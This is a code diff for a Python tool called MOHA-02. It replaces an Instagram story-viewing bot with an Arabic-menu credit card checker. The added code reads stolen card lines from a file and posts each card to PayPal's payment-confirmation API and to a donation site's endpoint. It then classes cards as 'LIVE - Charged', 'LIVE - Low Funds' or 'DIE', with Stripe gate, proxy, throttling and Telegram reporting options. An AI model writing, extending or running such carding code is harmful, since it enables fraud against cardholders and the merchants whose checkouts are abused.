-                                MohaLuxuryUI.print_status("success", f"Watched: @{username}")
-                            else:
-                                self.fail_count += 1
-                            time.sleep(random.uniform(1.5, 3.5))
-            except Exception:
-                continue
+            h_conf = {
+                'authorization': f'Bearer {at}', 'content-type': ConnectionEncryptor.get_header("json_type"),
+                'origin': ConnectionEncryptor.get_header("origin_paypal"), 'user-agent': ConnectionEncryptor.get_header("user_agent")
+            }
+            payl = {
+                'payment_source': {'card': {'number': card, 'expiry': f'20{year}-{month}', 'security_code': cvv}}
+            }
+            await session.post(f'https://cors.api.paypal.com/v2/checkout/orders/{oid}/confirm-payment-source', headers=h_conf, json=payl)
 
-    def process_list_stories(self, user_list):
-        for username in user_list:
-            MohaLuxuryUI.print_status("wait", f"Checking stories for @{username}...")
-            user_id = self.core.get_user_data(username)
-            if user_id:
-                stories_data = self.core.fetch_user_stories(user_id)
-                if stories_data and 'reels' in stories_data and user_id in stories_data['reels']:
-                    items = stories_data['reels'][user_id]['items']
-                    for item in items:
-                        media_id = item['pk']
-                        taken_at = item['taken_at']
-                        if self.core.mark_story_seen(media_id, user_id, taken_at):
-                            self.success_count += 1
-                            MohaLuxuryUI.print_status("success", f"Watched: @{username}")
-                        time.sleep(random.uniform(2.0, 4.0))
-                else:
-                    MohaLuxuryUI.print_status("info", f"No active stories for @{username}")
-            else:
-                MohaLuxuryUI.print_status("error", f"User @{username} not found.")
-            time.sleep(random.uniform(1.0, 2.0))
+            async with session.post(url_aj, params={'action': 'give_paypal_commerce_approve_order', 'order': oid}, data=form, cookies=cookies) as resp:
+                res_text = await resp.text()
+                if 'true' in res_text or 'success' in res_text: return "✅ LIVE - Charged"
+                if 'INSUFFICIENT_FUNDS' in res_text: return "✅ LIVE - Low Funds"
+                return "❌ DIE - Declined"
 
-def main():
-    MohaLuxuryUI.print_logo()
-    
-    session_id = input(f"{W}[{C}?{W}] Enter Instagram Session ID: {Y}")
-    if not session_id:
-        MohaLuxuryUI.print_status("error", "Session ID is required!")
-        sys.exit()
+    async def run_single(self, card_str):
+        p = card_str.split("|")
+        if len(p) != 4: return "❌ DIE - Format Error"
+        return await self.Check(p[0], p[1], p[2], p[3], self.GenMail())
 
-    engine = MohaEngine(session_id)
+def advanced_settings_menu():
+    global ADVANCED_SETTINGS
+    ADVANCED_SETTINGS = load_advanced_settings()
+    show_banner()
+    console.print(Panel.fit(f"[{C.neon_cyan}]الاعدادات المتقدمة - MOHA[/{C.neon_cyan}]", border_style=C.neon_cyan))
+    print(f"\n[1] تغيير التأخير (الحالي: {ADVANCED_SETTINGS['delay']} ث)")
+    print(f"[2] اعدادات البروكسي")
+    print(f"[3] العودة")
+    ch = input(f"\n{C.lcyan} ╭─اختر: {C.lgreen}$ {C.reset}").strip()
+    if ch == '1':
+        try:
+            d = float(input(f"{C.lcyan} ╭─أدخل الثواني: {C.lgreen}$ {C.reset}").strip())
+            ADVANCED_SETTINGS['delay'] = d
+            save_advanced_settings(ADVANCED_SETTINGS)
+        except: pass
+    elif ch == '2':
+        up = input(f"{C.lcyan} ╭─تفعيل بروكسي؟ (y/n): {C.lgreen}$ {C.reset}").strip().lower()
+        ADVANCED_SETTINGS['use_proxy'] = (up == 'y')
+        save_advanced_settings(ADVANCED_SETTINGS)
 
+def bot_settings_menu():
+    st = load_settings()
     while True:
-        MohaLuxuryUI.print_logo()
-        print(f"{C}    Main Menu Operations:{W}")
-        print(f"    {Y}[1]{W} Watch Followers Stories (Auto-Tray)")
-        print(f"    {Y}[2]{W} Watch Celebrity Stories (Pre-defined)")
-        print(f"    {Y}[3]{W} Watch Stories from Custom User List")
-        print(f"    {Y}[4]{W} Watch Stories from Search Keyword")
-        print(f"    {Y}[E]{W} Exit MOHA-02 System")
-        print(f"{Y}    -----------------------------------------------------------{X}")
+        show_banner()
+        tbl = Table(title="🤖 إعدادات بوت MOHA-02", border_style=C.neon_cyan)
+        tbl.add_row("[1]", "تفعيل البوت", "✅" if st.get('bot_enabled') else "❌")
+        tbl.add_row("[2]", "التوكن", st.get('bot_token')[:10]+"..." if st.get('bot_token') else "مفقود")
+        tbl.add_row("[3]", "المعرف", st.get('chat_id') or "مفقود")
+        tbl.add_row("[4]", "رجوع", "")
+        console.print(tbl)
+        c = input(f"\n{C.lcyan} ╭─اختر: {C.lgreen}$ {C.reset}").strip()
+        if c == '1': st['bot_enabled'] = not st.get('bot_enabled'); save_settings(st)
+        elif c == '2': st['bot_token'] = input("Token: "); save_settings(st)
+        elif c == '3': st['chat_id'] = input("ID: "); save_settings(st)
+        elif c == '4': break
+def main_menu():
+    open_socials()
+    while True:
+        show_banner()
+        menu_table = Table(box=box.DOUBLE_EDGE, border_style=C.neon_cyan, min_width=50)
+        menu_table.add_column("MOHA-02 SYSTEM", justify="center", style=C.lcyan)
+        menu_table.add_row(f"[1] فحص بطاقات (Gate: PayPal)")
+        menu_table.add_row(f"[2] فحص بطاقات (Gate: Stripe Auth)")
+        menu_table.add_row(f"[3] إعدادات بوت التليجرام")
+        menu_table.add_row(f"[4] الإعدادات المتقدمة")
+        menu_table.add_row(f"[5] الخروج")
+        console.print(menu_table)
         
-        choice = input(f"{W}[{C}MOHA{W}] Select Option: {G}").upper()
-
+        choice = input(f"\n{C.lcyan} ╭─MOHA-SYSTEM: {C.lgreen}$ {C.reset}").strip()
+        
         if choice == '1':
-            engine.process_followers_stories()
-            input(f"\n{W}Process Finished. Success: {G}{engine.success_count}{W}. Press Enter...")
-        
+            run_checker("PayPal")
         elif choice == '2':
-            engine.process_list_stories(CELEBS)
-            input(f"\n{W}Process Finished. Success: {G}{engine.success_count}{W}. Press Enter...")
-
+            run_checker("Stripe")
         elif choice == '3':
-            path = input(f"{W}[{C}?{W}] Enter path to users file (e.g., users.txt): {Y}")
-            if os.path.exists(path):
-                with open(path, 'r') as f:
-                    users = [line.strip() for line in f if line.strip()]
-                engine.process_list_stories(users)
-            else:
-                MohaLuxuryUI.print_status("error", "File not found!")
-            input(f"\n{W}Press Enter to continue...")
-
+            bot_settings_menu()
         elif choice == '4':
-            keyword = input(f"{W}[{C}?{W}] Enter Search Keyword: {Y}")
-            # Logic for search-based story watching (Top Search API)
-            MohaLuxuryUI.print_status("info", f"Searching for users related to '{keyword}'...")
-            # (Detailed implementation of search logic...)
-            
-        elif choice == 'E':
-            MohaLuxuryUI.print_status("info", "Thank you for using MOHA-02 SYSTEM. Goodbye!")
-            sys.exit()
+            advanced_settings_menu()
+        elif choice == '5':
+            sys.exit(f"\n{C.lyellow}إلى اللقاء يا موحا!{C.reset}")
+
+def run_checker(gate_type):
+    show_banner()
+    console.print(f"[{C.neon_cyan}]بدء الفحص باستخدام: {gate_type}[/{C.neon_cyan}]")
+    file_path = input(f"{C.lcyan} ╭─مسار ملف البطاقات: {C.lgreen}$ {C.reset}").strip()
+    
+    if not os.path.exists(file_path):
+        console.print(f"[{C.fail_red}]الملف غير موجود![/{C.fail_red}]")
+        time.sleep(2)
+        return
+
+    with open(file_path, 'r') as f:
+        cards = [line.strip() for line in f if line.strip()]
+
+    stats = Statistics()
+    stats.start()
+    adv = load_advanced_settings()
+
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[progress.description]{task.description}"),
+        BarColumn(bar_width=None, style="black", complete_style="green"),
+        TaskProgressColumn(),
+        console=console,
+        transient=True
+    ) as progress:
+        task = progress.add_task(f"[white]جاري الفحص...", total=len(cards))
         
-        else:
-            MohaLuxuryUI.print_status("error", "Invalid Option selected!")
-            time.sleep(1)
+        for card in cards:
+            try:
+                if gate_type == "PayPal":
+                    checker = PayPal(card)
+                    result = checker.Main()
+                else:
+                    checker = StripeAuth(card)
+                    result = checker.Main()
+                
+                stats.update(result, card)
+                
+                res_color = C.success_green if "LIVE" in result else C.fail_red
+                console.print(f"[{C.lcyan}MOH{C.lcyan}] {card} -> [{res_color}]{result}[/{res_color}]")
+                
+                if adv['delay'] > 0:
+                    time.sleep(adv['delay'])
+                    
+            except Exception as e:
+                console.print(f"[{C.fail_red}]خطأ في البطاقة: {str(e)[:20]}[/{C.fail_red}]")
+            
+            progress.update(task, advance=1)
+
+    stats.display_final(f"MOHA-02 {gate_type}", file_path)
+    input(f"\n{C.lyellow}اضغط Enter للعودة للقائمة...{C.reset}")
 
 if __name__ == "__main__":
     try:
-        main()
+        # التفعيل التلقائي باسمك
+        status, msg = check_license("ADMIN-MOHA")
+        if status:
+            main_menu()
+        else:
+            print(f"خطأ في النظام: {msg}")
     except KeyboardInterrupt:
-        print(f"\n{R}[!] Forced exit by user.")
-        sys.exit()
+        sys.exit(f"\n{C.lyellow}تم الإغلاق بواسطة موحا الشلفاوي{C.reset}")
